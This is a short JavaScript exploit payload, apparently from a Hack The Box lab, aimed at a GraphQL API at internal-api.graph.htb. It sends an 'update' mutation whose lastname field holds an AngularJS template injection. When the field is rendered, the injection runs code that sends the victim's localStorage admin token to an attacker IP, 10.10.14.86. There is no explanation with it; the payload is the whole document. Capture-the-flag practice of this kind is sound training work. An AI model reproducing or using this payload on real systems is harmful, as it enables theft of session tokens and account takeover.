var req = new XMLHttpRequest();
req.open('POST', 'http://internal-api.graph.htb/graphql', false);
req.setRequestHeader("Content-Type","text/plain");
req.withCredentials = true;
var body = JSON.stringify({
        operationName: "update",
        variables: {
                firstname: "mark",
                lastname: "{{constructor.constructor('fetch(\"http://10.10.14.86/token?adminToken=\" + localStorage.getItem(\"adminToken\"))')()}}",
                id: "62fa89a2c4b00611835c41de",
                newusername: "mark"
        },
        query: "mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}"
});
req.send(body);
